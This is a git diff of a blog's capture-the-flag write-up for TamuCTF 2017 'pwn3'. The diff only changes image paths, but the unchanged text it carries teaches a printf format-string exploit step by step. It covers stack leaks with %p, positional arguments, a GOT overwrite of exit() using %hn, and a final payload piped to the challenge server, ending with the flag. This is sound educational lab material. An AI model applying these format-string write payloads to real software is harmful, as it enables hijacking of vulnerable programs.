@@ -19,8 +19,7 @@ summary: "Here we are, with another pwning challenge. Let's start :grin:."
 cardthumbimage: "/assets/TamuCTF2017/title.png"
 ---
 
-
-![Pwn3 challenge description](assets/1-pwn3_description.png)
+![Pwn3 challenge description](/assets/1-pwn3_description.png)
 
 Here we are, with another pwning challenge. Let's start :grin:.
 
@@ -50,7 +49,7 @@ Lets check what is happing inside the main one.
 [0x080484b0]> pdf @ main
 ```
 
-![Pwn3 challenge description](assets/2-pwn3_main.png)
+![Pwn3 challenge description](/assets/2-pwn3_main.png)
 
 Well, it seems that the execution is pretty straightforward.
 * Using gets function it saves your input in the memory address **local_208h** is pointing to.
@@ -63,18 +62,18 @@ We can extract the following conclusions:
 
 But, wait a moment, that **printf** call is a bit strange.
 
-![Pwn3 challenge description](assets/3-pwn3_printf_call.png)
+![Pwn3 challenge description](/assets/3-pwn3_printf_call.png)
 
 One push! that is strange because normally **printf** accepts two arguments at least. It should look something like this:
 
-![Pwn3 challenge description](assets/4-pwn3_printf_correct_vs_incorrect_call.png)  
+![Pwn3 challenge description](/assets/4-pwn3_printf_correct_vs_incorrect_call.png)  
 If the user's input is used as the first argument of **printf**, it means that the input will be interpreted as the format string itself.
 
 > Aham, but... what implications does it have?
 
 Well, with normals inputs, **printf** will behave "corretly", BUT look what happens if you provide format modifiers in your input (`input = "%p %p %p %p"`):
 
-![Pwn3 printf format attack leaking information](assets/5-pwn3_printf_leak_memory.png)
+![Pwn3 printf format attack leaking information](/assets/5-pwn3_printf_leak_memory.png)
 
 **printf** is leaking information of the stack!  
 We are being able to see the content of the stack remotely!
@@ -104,7 +103,7 @@ We will input 4 As ("AAAA", which will be written in memory as `0x41414141` and 
 $ python -c 'print("AAAA" + "%p %p %p %p %p ")' | ./pwn3; echo
 ```
 
-![Pwn3 leaking some stack pointers](assets/6-pwn3_printf_leak_addr.png)
+![Pwn3 leaking some stack pointers](/assets/6-pwn3_printf_leak_addr.png)
 
 Good, it is in the 4^th^ `%p`. But imagine if the address was in the 300^th^ position. We had to write 300 times `%p`!
 > What a mess! what then?
@@ -117,7 +116,7 @@ $ python -c 'print("AAAA" + "%4$p")' | ./pwn3; echo
 
 Basically using `<number>$` we are able to select the position of the data we want to select.
 
-![Pwn3 leaking the exact data](assets/7-pwn3_printf_position_arg.png)
+![Pwn3 leaking the exact data](/assets/7-pwn3_printf_position_arg.png)
 
 > Good! now we know that the address we need to write to is stored in the 4^th^ position. what now?
 
@@ -136,12 +135,12 @@ For that, we need to know, the specific function (and its address) of the GOT we
 ```bash
 $ objdump -R pwn3
 ```
-![Pwn3 GOT table with objdump](assets/8-pwn3_objdump.png)
+![Pwn3 GOT table with objdump](/assets/8-pwn3_objdump.png)
 
 But not all of them are good for us, the function to be replaced must be executed **AFTER** the vulnerable **printf** call.  
 Radare2 will give us the answer.
 
-![Pwn3 choosing GOT function](assets/9-pwn3_choosing_GOT_func.png)
+![Pwn3 choosing GOT function](/assets/9-pwn3_choosing_GOT_func.png)
 
 We have a winner! exit() function.
 
@@ -175,13 +174,13 @@ We know `%n` can write the length of the string with preceeds itself into the pr
 ```bash
 $ python -c 'print("\x1c\xa0\x04\x08" + "A"*134514087 + "%4$n")' | ./pwn3; echo
 ```
-![Pwn3 broken pipe error](assets/10-pwn3_broken_pipe.png)
+![Pwn3 broken pipe error](/assets/10-pwn3_broken_pipe.png)
 But aparently that is just to much for the pipe.  
 We could try the `%<times>x` parameter. It just print as many memory bytes as we tell it to. 
 ```bash
 $ python -c 'print("\x1c\xa0\x04\x08" + "%x"*134514087 + "%4$n")' | ./pwn3; echo
 ```
-![Pwn3 broken pipe error 2](assets/11-pwn3_broken_pipe_2.png)
+![Pwn3 broken pipe error 2](/assets/11-pwn3_broken_pipe_2.png)
 Meh! same result.  
 But wait a moment, there is a special paramater `%h` which does the following:
 > Specifies that a following d, i, o, u, x, or X conversion specifier applies to a short int or unsigned short int argument (the argument will have been promoted according to the integer promotions, but its value shall be converted to short int or unsigned short int before printing); **or that a following n conversion speciﬁer applies to a pointer to a short int argument**.  -- C is For C Programming - Cask J. Thomson
@@ -190,7 +189,7 @@ Basically this is converting 4-bytes datatypes into 2-bytes ones.
 We can use it to save our big value in two times. First we will save one half and then the other.  
 Let's represent this.
     
-![Pwn3 Scheme](assets/12-pwn3_scheme.png)    
+![Pwn3 Scheme](/assets/12-pwn3_scheme.png)    
     
 Then, it makes sense that the first value to be written should be the lowest one `0x804-8 = 2044` in the address `0804a01e` (provided in big endian) which will be stored in the `4th` position of the stack.
 
@@ -210,7 +209,7 @@ $ python -c 'print("\x1e\xa0\x04\x08" + "\x1c\xa0\x04\x08" + "%2044x" + "%4$hn" 
 | nc pwn.ctf.tamu.edu 4323
 ```
 
-![Pwn3 Scheme](assets/13-pwn3_getting_the_flag.png)    
+![Pwn3 Scheme](/assets/13-pwn3_getting_the_flag.png)    
 
 Answer: gigem{F0RM@1NG_1S_H4RD}
 
